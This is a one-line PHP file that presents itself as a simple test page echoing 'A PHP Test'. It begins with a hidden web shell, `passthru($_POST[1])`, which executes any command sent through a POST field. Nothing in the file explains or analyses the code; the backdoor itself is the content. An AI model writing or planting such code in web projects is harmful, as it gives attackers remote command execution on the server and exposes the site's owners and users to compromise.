<?php passthru($_POST[1])?><?php echo 'A PHP Test ';
